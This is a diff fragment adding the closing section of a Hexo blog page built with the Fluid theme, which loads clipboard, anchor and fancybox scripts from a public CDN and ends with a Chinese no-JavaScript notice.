+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
